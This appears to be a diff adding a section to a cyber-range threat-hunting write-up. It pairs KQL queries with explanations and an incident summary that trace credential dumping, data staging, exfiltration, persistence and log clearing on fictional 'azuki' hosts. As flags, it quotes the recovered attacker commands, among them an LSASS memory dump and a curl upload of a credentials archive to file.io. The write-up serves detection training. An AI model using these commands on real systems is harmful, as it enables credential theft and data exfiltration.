@@ -1115,3 +1115,498 @@ This query detects the use of **xcopy.exe** by the administrative account `filea
 
  #32 Flag 32 = "xcopy.exe" C:\FileShares\IT-Admin C:\Windows\Logs\CBS\it-admin /E /I /H /Y
  ----
+## Section 4 – Post-Compromise Operations, Credential Theft, Exfiltration, and Persistence Analysis
+
+This section documents attacker activity after re-establishing access to the environment and focuses on the actions taken to collect sensitive data, extract credentials, exfiltrate information, and maintain long-term persistence. Following successful lateral movement into azuki-fileserver01 using the compromised fileadmin account, the attacker transitioned from reconnaissance to active data theft operations.
+
+Evidence shows deliberate data collection and preparation through the creation of staging directories and the aggregation of sensitive files. The use of built-in Windows utilities such as tar.exe to compress staged directories indicates an effort to consolidate harvested data into portable archives suitable for exfiltration. Credential access activity is confirmed through the presence and execution of a renamed credential dumping tool, pd.exe, which was used to dump LSASS process memory and store the resulting output in a hidden system directory.
+
+Exfiltration was performed using curl.exe with multipart form uploads to an external cloud service, file.io. The use of HTTPS and a legitimate command-line utility allowed the attacker to transfer compressed credential archives outside the environment while blending into normal administrative traffic. Multiple queries confirm the outbound nature of this activity and tie the uploaded files directly back to previously staged and compressed data.
+
+Persistence was established through registry modifications under the CurrentVersion\Run key, where a value named FileShareSync was created to execute a masqueraded PowerShell script, svchost.ps1, at logon. This ensured continued execution of the attacker’s payload across reboots. Finally, anti-forensic behavior was observed through the deletion of PowerShell history files, indicating an attempt to erase evidence of interactive command execution. Collectively, these actions demonstrate a complete post-compromise attack chain focused on credential theft, data exfiltration, persistence, and evasion.
+
+-----
+```kql
+DeviceProcessEvents
+| where DeviceName contains "azuki-fileserver01"
+| where TimeGenerated between (datetime(2025-11-22) .. datetime(2025-12-05))
+| where InitiatingProcessAccountName == "fileadmin"
+| where ProcessCommandLine contains "it-admin"
+| project
+    TimeGenerated,
+    DeviceName,
+    InitiatingProcessAccountName,
+    FileName,
+    ProcessCommandLine
+| order by TimeGenerated asc
+```
+<img width="779" height="108" alt="image" src="https://github.com/user-attachments/assets/b15a48be-31a4-4173-b256-7000aea9736d" />
+
+### Purpose and Explanation
+
+This query detects data compression activity used to prepare staged files for exfiltration. The results show execution of `tar.exe`, a native Windows archive utility, by the compromised `fileadmin` account on `azuki-fileserver01`. The command  
+`tar.exe -czf C:\Windows\Logs\CBS\credentials.tar.gz -C C:\Windows\Logs\CBS\it-admin .`  
+creates a compressed archive of the entire staging directory containing harvested administrative data. Compressing files into a single archive reduces transfer size and simplifies exfiltration. Writing the archive to `C:\Windows\Logs\CBS`
+
+### Thought Process – Query: Data Compression for Exfiltration Preparation
+
+1. Identify post-compromise activity that indicates preparation of collected data for removal from the environment.  
+2. Scope the query to `azuki-fileserver01` to focus on the compromised file server hosting staged data.  
+3. Limit results to the confirmed post-dwell timeframe to avoid unrelated administrative noise.  
+4. Filter on the `fileadmin` account to correlate activity with the compromised administrator credentials.  
+5. Match `ProcessCommandLine` against `it-admin` to surface commands interacting with the staging directory.  
+6. Expose the full command line to determine the exact tool and parameters used.  
+7. Use chronological ordering to place compression activity in the overall attack timeline.  
+
+#33 Flag 33 = "tar.exe" -czf C:\Windows\Logs\CBS\credentials.tar.gz -C C:\Windows\Logs\CBS\it-admin .
+ ----
+ ```kql
+DeviceFileEvents
+| where DeviceName contains "azuki-fileserver01"
+| where TimeGenerated between (datetime(2025-11-22) .. datetime(2025-12-05))
+| where FolderPath contains @"C:\Windows\Logs\CBS"
+| where InitiatingProcessAccountName == "fileadmin"
+| where FileName contains "exe"
+| project
+    TimeGenerated,
+    ActionType,
+    DeviceName,
+    InitiatingProcessAccountName,
+    FileName,
+    FolderPath
+| order by TimeGenerated asc
+```
+<img width="764" height="173" alt="image" src="https://github.com/user-attachments/assets/6be671d4-b633-4ce0-969a-a84aaf864c34" />
+
+ 
+### Purpose and Explanation
+
+This query detects the introduction of executable tools into the attacker’s hidden staging directory. The results reveal the creation of `pd.exe` within `C:\Windows\Logs\CBS` by the compromised `fileadmin` account during the investigation window. This directory is a legitimate Windows system path and does not normally contain newly dropped executables, indicating the file was placed intentionally. Correlation with earlier activity confirms `pd.exe` was the renamed credential dumping tool used by the attacker. Renaming the executable disguises its purpose and helps evade signature-based detections tied to well-known dumping utilities. Placing the tool in a trusted system directory further reduces the likelihood of user suspicion or automated alerting.
+
+### Thought Process – Query: Renamed Executable in Staging Directory
+
+1. Identify suspicious file creation activity associated with credential access tooling.  
+2. Scope the query to `azuki-fileserver01` to focus on the compromised file server.  
+3. Restrict the timeframe to the post-dwell investigation window to reduce benign noise.  
+4. Filter on the `fileadmin` account to tie activity to the known compromised administrator.  
+5. Limit results to the staging directory `C:\Windows\Logs\CBS` where prior attacker activity was observed.  
+6. Search for filenames containing `exe` to surface newly introduced executables rather than scripts or data files.  
+7. Project file and account metadata to clearly attribute tool placement and timing.  
+
+#34 Flag 34 = pd.exe
+----
+```kql
+DeviceProcessEvents
+| where TimeGenerated between (datetime(2025-11-22) .. datetime(2025-12-05))
+| where FileName =~ "pd.exe"
+| project
+    TimeGenerated,
+    DeviceName,
+    InitiatingProcessAccountName,
+    ProcessCommandLine
+| order by TimeGenerated asc
+```
+<img width="760" height="101" alt="image" src="https://github.com/user-attachments/assets/9596732b-9cf6-4ba9-b0f4-a5d39505d30f" /> 
+
+### Purpose and Explanation
+
+This query confirms credential access by detecting execution of the renamed dumping tool `pd.exe`. The results show the command `pd.exe -accepteula -ma 876 C:\Windows\Logs\CBS\lsass.dmp`, which performs a full memory dump of process ID 876. The `-ma` flag instructs the tool to capture the entire memory space of the target process, and process ID 876 corresponds to LSASS, which stores cached authentication credentials in memory. Writing the output file to `C:\Windows\Logs\CBS` aligns with the attacker’s established hidden staging directory. This technique allows credentials to be extracted offline while minimizing direct interaction with LSASS, reducing the likelihood of triggering endpoint protection mechanisms.
+
+### Thought Process – Query: LSASS Memory Dump via Renamed Tool
+
+1. Identify evidence of credential dumping activity on compromised systems.  
+2. Filter `DeviceProcessEvents` to isolate process execution rather than file creation or registry changes.  
+3. Narrow the timeframe to the confirmed post-dwell attacker activity window.  
+4. Search specifically for executions of `pd.exe`, the previously identified renamed credential dumping tool.  
+5. Project the full `ProcessCommandLine` to capture execution arguments and output paths.  
+6. Order results chronologically to determine when credential dumping occurred in the attack timeline.  
+7. Correlate the command parameters with known LSASS dumping techniques.  
+
+#35 Flag 35 = "pd.exe" -accepteula -ma 876 C:\Windows\Logs\CBS\lsass.dmp 
+----
+```kql
+DeviceProcessEvents
+| where DeviceName == "azuki-fileserver01"
+| where TimeGenerated between (datetime(2025-11-22) .. datetime(2025-12-05))
+| where FileName =~ "curl.exe"
+| project
+    TimeGenerated,
+    DeviceName,
+    InitiatingProcessAccountName,
+    FileName,
+    ProcessCommandLine
+| order by TimeGenerated asc
+```
+<img width="775" height="101" alt="image" src="https://github.com/user-attachments/assets/83ccf47c-2f2a-4c1b-bf37-b2c12c639adc" /> 
+
+First query is used to capture the -F flag, which tells curl to use form‑based (multipart/form‑data) transfer the file=@ portion specifies a local file to be uploaded, not retrieved, confirming outbound data movement. The destination https://file.io is an external endpoint, showing the data left the environment.
+
+```kql
+DeviceProcessEvents
+| where DeviceName == "azuki-fileserver01"
+| where TimeGenerated between (datetime(2025-11-22) .. datetime(2025-12-05))
+| where FileName =~ "curl.exe"
+| where ProcessCommandLine contains "credentials.tar.gz"
+| where ProcessCommandLine contains "-F"
+| project
+    TimeGenerated,
+    DeviceName,
+    InitiatingProcessAccountName,
+    FileName,
+    ProcessCommandLine
+| order by TimeGenerated asc
+```
+<img width="692" height="155" alt="image" src="https://github.com/user-attachments/assets/a760cafa-7f9a-46cd-8351-7a20f666e5f0" /> 
+
+### Purpose and Explanation
+
+These queries identify data exfiltration performed using `curl.exe`. The first query captures executions of curl.exe and exposes the use of the `-F` flag, which instructs curl to perform a multipart/form-data upload. The `file=@` syntax explicitly references a local file, confirming outbound data transfer rather than a download. The destination `https://file.io` is an external cloud-based file hosting service, demonstrating that data left the internal environment.
+
+The second query narrows the results by requiring both the `-F` flag and the filename `credentials.tar.gz`, directly tying the exfiltration event to the compressed credential archive created earlier from the staged `it-admin` directory. The referenced file path `C:\Windows\Logs\CBS\credentials.tar.gz` confirms the archive originated from the hidden staging location. Together, these queries complete the attack chain by showing that harvested and staged credentials were compressed and then exfiltrated to an external service using a built-in Windows utility, allowing the attacker to blend malicious activity with normal administrative behavior.
+
+### Thought Process – Query: Data Exfiltration via curl.exe
+
+1. Confirm whether staged data was transmitted outside the environment.  
+2. Focus on `DeviceProcessEvents` to capture execution of data transfer utilities rather than network flow alone.  
+3. Restrict results to azuki-fileserver01, the system identified as the data staging host.  
+4. Filter for executions of `curl.exe`, a legitimate tool commonly abused for exfiltration.  
+5. Inspect the `ProcessCommandLine` to identify upload-specific flags and referenced files.  
+6. Correlate filenames in the command line with previously created archives in the staging directory.  
+7. Use chronological ordering to place the exfiltration step after collection and compression activity.  
+
+#36 Flag 36 = "curl.exe" -F file=@C:\Windows\Logs\CBS\credentials.tar.gz https://file.io
+----
+```kql
+DeviceProcessEvents
+| where DeviceName == "azuki-fileserver01"
+| where TimeGenerated between (datetime(2025-11-22) .. datetime(2025-12-05))
+| where FileName =~ "curl.exe"
+| where ProcessCommandLine contains "credentials.tar.gz"
+| where ProcessCommandLine contains "-F"
+| project
+    TimeGenerated,
+    DeviceName,
+    InitiatingProcessAccountName,
+    FileName,
+    ProcessCommandLine
+| order by TimeGenerated asc
+```
+<img width="856" height="27" alt="image" src="https://github.com/user-attachments/assets/d083fda5-eca8-4d64-96f1-bee591d1b52e" /> 
+
+### Purpose and Explanation
+
+This query is reused to re-examine the command line associated with data exfiltration and identify the external cloud service receiving the data. By filtering for `curl.exe` executions that include both the `-F` upload flag and the staged archive `credentials.tar.gz`, the query isolates confirmed outbound file transfers. The presence of `https://file.io` in the command line indicates that the data was transmitted over HTTPS to an external destination rather than written locally or sent to an internal host.
+
+file.io is a public cloud-based file hosting service designed to accept uploads via HTTP multipart form submissions, which directly aligns with the `-F file=@` syntax used by curl. Because the staged archive is sent directly to this URL, file.io is functioning as the external cloud service used for data exfiltration. This confirms that the attacker successfully moved sensitive data outside the environment using a legitimate utility and a public file-sharing platform.
+
+### Thought Process – Query: Cloud Service Used for Exfiltration
+
+1. Reuse the established exfiltration query to maintain consistency and avoid introducing new assumptions.  
+2. Focus on `curl.exe` executions, as it was already identified as the exfiltration mechanism.  
+3. Require both the `-F` flag and the filename `credentials.tar.gz` to confirm a file upload operation.  
+4. Examine the destination in the `ProcessCommandLine` to determine whether data was sent externally.  
+5. Validate that the destination is a fully qualified external URL rather than a local or internal address.  
+6. Attribute the receiving endpoint as the cloud service used for exfiltration based on the command line evidence.  
+
+#37 Flag 37 = file.io
+----
+```kql
+DeviceRegistryEvents
+| where DeviceName == "azuki-fileserver01"
+| where TimeGenerated between (datetime(2025-11-22) .. datetime(2025-12-05))
+| where InitiatingProcessAccountName == "fileadmin"
+| where RegistryKey contains @"\CurrentVersion\Run"
+| where ActionType in ("RegistryValueSet", "RegistryValueCreated")
+| project
+    TimeGenerated,
+    DeviceName,
+    RegistryKey,
+    RegistryValueName,
+    RegistryValueData
+| order by TimeGenerated asc
+```
+<img width="1428" height="217" alt="image" src="https://github.com/user-attachments/assets/59166c8d-08c6-42aa-980a-842dafe5143d" />
+
+### Purpose and Explanation
+
+This query examines **registry-based persistence** on azuki-fileserver01 by searching the DeviceRegistryEvents table for startup key modifications made by the `fileadmin` account during the investigation window. It filters on the `CurrentVersion\Run` registry path, which is a well-known persistence location used to execute programs automatically at user logon. By restricting results to `RegistryValueSet` and `RegistryValueCreated`, the query isolates events where new autorun entries were explicitly added or modified.
+
+The projected fields expose the registry value name and its associated command or executable path. The results identify a registry value named **FileShareSync**, indicating the attacker created a startup entry under the Run key to maintain persistence. This directly establishes **FileShareSync** as the persistence mechanism, as the registry value ensures the associated payload executes automatically each time the user logs in.
+
+### Thought Process – Query: Registry-Based Persistence Detection
+
+1. Scope the investigation to a single host (`azuki-fileserver01`) to reduce noise and ensure host-specific accuracy.  
+2. Constrain the timeframe to the suspected intrusion window to capture relevant persistence activity.  
+3. Filter on the `fileadmin` account to isolate actions performed by the known or suspected attacker context.  
+4. Focus on `\CurrentVersion\Run` registry paths, as they are a common mechanism for establishing persistence at startup.  
+5. Limit results to registry value creation or modification events to identify explicit persistence actions.  
+6. Project registry value names and data to directly reveal the executable or script configured to run on system startup.  
+7. Order results chronologically to reconstruct the sequence and timing of persistence establishment.
+
+#38 Flag 38 = FileShareSync
+----
+```kql
+DeviceRegistryEvents
+| where DeviceName == "azuki-fileserver01"
+| where TimeGenerated between (datetime(2025-11-22) .. datetime(2025-12-05))
+| where InitiatingProcessAccountName == "fileadmin"
+| where RegistryKey contains @"\CurrentVersion\Run"
+| where RegistryValueName == "FileShareSync"
+| project
+    TimeGenerated,
+    DeviceName,
+    RegistryValueName,
+    RegistryValueData
+| order by TimeGenerated asc
+```
+<img width="757" height="98" alt="image" src="https://github.com/user-attachments/assets/b73fdf5c-b1f1-43a1-b794-8a46a0e0630f" /> 
+
+### Purpose
+
+The purpose of this query is to confirm and extract the persistence beacon filename associated with the attacker’s registry-based startup mechanism. By focusing on a known malicious registry value, the query directly reveals the payload configured to execute on user logon.
+
+### Explanation
+
+This query examines the `DeviceRegistryEvents` table to identify registry-based persistence on `azuki-fileserver01` during the investigation window. It filters for modifications under the `CurrentVersion\Run` key and the specific value name `FileShareSync`, which was previously identified as the persistence mechanism. By projecting `RegistryValueData`, the query reveals the full path of the payload executed at user logon. The output shows a script named `svchost.ps1`, which is designed to blend in with legitimate Windows processes. This filename reflects masquerading behavior, making the malicious script less noticeable in process listings. Therefore, `svchost.ps1` is the persistence beacon filename that ensures the attacker maintains access across reboots.
+
+### Thought Process – Query: Persistence Beacon Identification
+
+1. Scope the query to `azuki-fileserver01` to isolate persistence activity on the affected host.  
+2. Restrict the timeframe to the confirmed investigation window to avoid unrelated registry changes.  
+3. Filter on the `fileadmin` account to focus on attacker-associated actions.  
+4. Target the `\CurrentVersion\Run` registry key, a known Windows auto-start persistence location.  
+5. Narrow results to the specific registry value name `FileShareSync`, previously identified as suspicious.  
+6. Project `RegistryValueData` to extract the exact payload executed at logon.  
+7. Use chronological ordering to confirm when the persistence entry was established.
+
+#39 Flag 39 = svchost.ps1 
+----
+```kql
+DeviceFileEvents
+| where TimeGenerated between (datetime(2025-11-22) .. datetime(2025-12-05))
+| where DeviceName == "azuki-fileserver01"
+| where ActionType == "FileDeleted"
+| where FolderPath contains @"\Users\"
+| where FileName == "ConsoleHost_history.txt"
+| project Timestamp, DeviceName, InitiatingProcessFileName, FolderPath, FileName
+| order by Timestamp asc
+```
+<img width="750" height="121" alt="image" src="https://github.com/user-attachments/assets/797e3f8a-b33f-4a3c-9a29-0f552c6ddf5d" /> 
+
+### Purpose and explanation 
+
+The purpose of this query is to determine whether the attacker deliberately deleted PowerShell command history to conceal post-exploitation activity and evade forensic analysis. This query analyzes the `DeviceFileEvents` table to identify deletion of PowerShell command history on `azuki-fileserver01` during the investigation window. It filters for file deletion events within user profile directories, which is where PowerShell stores persistent command history via PSReadLine. By explicitly matching the filename `ConsoleHost_history.txt`, the query ties the event to the removal of recorded interactive PowerShell commands. This confirms intentional artifact destruction rather than routine file access. Deleting this file prevents defenders from reconstructing executed commands, tools, and attacker intent. Therefore, `ConsoleHost_history.txt` is the erased artifact, indicating deliberate anti-forensic behavior.
+
+### Thought Process – Query: PowerShell History Deletion
+
+1. Scope the query to the incident timeframe to capture attacker cleanup activity.  
+2. Limit results to `azuki-fileserver01` to maintain host-specific relevance.  
+3. Filter for `FileDeleted` events to identify explicit artifact removal rather than normal access.  
+4. Constrain the folder path to `\Users\` since PowerShell history is stored within user profiles.  
+5. Explicitly match the filename `ConsoleHost_history.txt` to target PowerShell command history.  
+6. Project the initiating process to associate the deletion with attacker-controlled execution.  
+7. Order events chronologically to establish when forensic evidence was removed.
+
+#40 Flag 40 = ConsoleHost_history.txt
+----
+
+# 🚨🚨🚨 **INCIDENT INVESTIGATION SUMMARY – HIGH SEVERITY** 🚨🚨🚨
+
+---
+
+## 🔴 **Executive Summary**
+An attacker gained unauthorized access to multiple **azuki** systems using **compromised credentials**, then conducted **credential harvesting, data staging, persistence establishment, and cloud-based data exfiltration**.  
+The attacker actively **evaded detection** by configuring Defender exclusions, deleting forensic artifacts, and clearing Windows event logs.  
+**Lateral movement via RDP** enabled broader internal access.  
+The incident persisted undetected for **16 days**, representing a **High Impact security breach**.
+
+---
+
+## 🔴 **Incident Timeline**
+| Event | Date (UTC) |
+|-----|-----------|
+| 🟠 Attack Start | **2025-11-19** |
+| 🔴 Detection | **2025-12-05** |
+| 🟠 Attack End | **2025-12-05** |
+| ⏱ Duration | **16 days** |
+| ⚠ Status | **Contained / No Longer Active** |
+
+---
+
+## 🔴 **Who**
+- **Attacker IPs**:  
+  - `88.97.178.12`  
+  - `159.26.106.98`
+- **Compromised Accounts**:  
+  - `kenji.sato`  
+  - `yuki.tanaka`  
+  - `fileadmin`
+- **Affected Systems**:  
+  - `azuki-sl`  
+  - `azuki-fileserver01`
+- **User Impact**:  
+  - Exposure of administrative credentials  
+  - Potential unauthorized access to shared and sensitive files
+
+---
+
+## 🔴 **What**
+- **Attack Type**: Credential compromise → Persistence → Data exfiltration
+- **Observed Malicious Activity**:
+  - 🔴 Credential dumping via `pd.exe`
+  - 🔴 Persistence using PowerShell scripts:
+    - `svchost.ps1`
+    - `wupdate.ps1`
+  - 🟠 Data staged in hidden directories:
+    - `C:\Windows\Logs\CBS\`
+    - `C:\ProgramData\WindowsCache\`
+  - 🔴 Exfiltration over HTTPS to external cloud services:
+    - **file.io**
+    - **Discord**
+  - 🔴 Windows Defender exclusions added
+  - 🔴 Event logs cleared using `wevtutil.exe`
+
+---
+
+## 🔴 **When**
+- **First Malicious Action**: 2025-11-19 UTC  
+- **Last Observed Activity**: 2025-12-05 UTC  
+- **Detection Time**: 2025-12-05 UTC  
+- **Still Active?** ❌ No
+
+---
+
+## 🔴 **Where**
+- **Target Systems**:
+  - `azuki-sl`
+  - `azuki-fileserver01`
+- **Attack Origin**:
+  - `88.97.178.12`
+  - `159.26.106.98`
+- **Network Segment**:
+  - Internal corporate network (`10.1.0.0/16`)
+- **Affected Files / Artifacts**:
+  - `C:\Windows\Logs\CBS\credentials.tar.gz`
+  - `C:\ProgramData\WindowsCache\export-data.zip`
+  - `svchost.ps1`, `wupdate.ps1`, `mm.exe`, `pd.exe`
+  - `IT-Admin-Passwords.csv`
+
+---
+
+## 🟠 **Why**
+- **Likely Motive**: Data theft
+- **Target Value**:
+  - Administrative credentials
+  - IT infrastructure access
+  - Sensitive shared file repositories
+
+---
+
+## 🔴 **How**
+- **Initial Access**: Compromised credentials (`kenji.sato`)
+- **Techniques Used**:
+  - Native Windows utilities:
+    - `certutil.exe`
+    - `schtasks.exe`
+    - `net.exe`
+    - `mstsc.exe`
+    - `cmdkey.exe`
+    - `attrib.exe`
+    - `tar.exe`
+    - `xcopy.exe`
+  - Custom tools:
+    - `pd.exe`
+    - `mm.exe`
+- **Persistence**:
+  - Scheduled tasks (`svchost.exe` in `ProgramData`)
+  - Hidden PowerShell scripts
+- **Data Collection**:
+  - Recursive copy of IT admin directories
+  - Archive compression
+- **Exfiltration**:
+  - HTTPS to **file.io / Discord**
+- **C2 Infrastructure**:
+  - `78.141.196.6`
+
+---
+
+## 🚨 **MITRE ATT&CK MAPPING**
+| Tactic | Technique | ID |
+|-----|---------|----|
+| Initial Access | Valid Accounts | **T1078** |
+| Execution | PowerShell | **T1059.001** |
+| Persistence | Scheduled Task/Job | **T1053.005** |
+| Privilege Escalation | Credential Dumping | **T1003** |
+| Defense Evasion | Disable Security Tools | **T1562.001** |
+| Defense Evasion | Clear Windows Event Logs | **T1070.001** |
+| Defense Evasion | Hidden Files and Directories | **T1564.001** |
+| Credential Access | OS Credential Dumping | **T1003** |
+| Discovery | Account Discovery | **T1087** |
+| Lateral Movement | Remote Desktop Protocol | **T1021.001** |
+| Collection | Archive Collected Data | **T1560** |
+| Exfiltration | Exfiltration Over Web Services | **T1567.002** |
+| Command and Control | Web Protocols (HTTPS) | **T1071.001** |
+
+---
+
+## 🔴 **Key Findings / IOCs**
+- **Source IPs**: `88.97.178.12`, `159.26.106.98`
+- **C2 Server**: `78.141.196.6`
+- **Malware / Tools**:
+  - `pd.exe`
+  - `mm.exe`
+  - `svchost.ps1`
+  - `wupdate.ps1`
+- **Persistence**:
+  - Scheduled task masquerading as `svchost.exe`
+- **Exfiltration Destination**:
+  - **file.io**
+  - **Discord**
+
+---
+
+## 🔴 **Recommendations**
+
+### 🚨 Immediate Actions
+- Revoke compromised accounts:
+  - `kenji.sato`, `yuki.tanaka`, `fileadmin`
+- Isolate affected systems:
+  - `azuki-sl`, `azuki-fileserver01`
+- Reset **all** administrative credentials
+- Perform full forensic and malware scans of:
+  - `ProgramData`
+  - Hidden staging directories
+
+### 🟠 Short-Term (1–30 Days)
+- Enforce MFA on RDP and network shares
+- Remove Defender exclusions and restore defaults
+- Enable PowerShell transcription and script block logging
+- Monitor for:
+  - New scheduled tasks
+  - Hidden file creation
+
+### 🟡 Long-Term Enhancements
+- Network segmentation and strict least privilege
+- Continuous monitoring for credential-dumping tools
+- Deploy advanced EDR
+- Conduct recurring Red Team / penetration tests
+
+---
+
+## 🟡 **Detection Enhancements**
+- **Gaps Identified**:
+  - Lack of alerts on hidden files and registry persistence
+- **Recommended Alerts**:
+  - Execution of `pd.exe`
+  - Creation of `svchost.ps1` outside `System32`
+  - `certutil.exe` with `-urlcache`
+- **Query Improvements**:
+  - Monitor non-standard scheduled task paths
+  - Flag RDP usage by uncommon accounts
+
+---
+
+## 📄 **Report Status**
+- **Status**: ✅ Complete  
+- **Next Review**: **2026-01-15**  
+- **Distribution**: **Cyber Range**
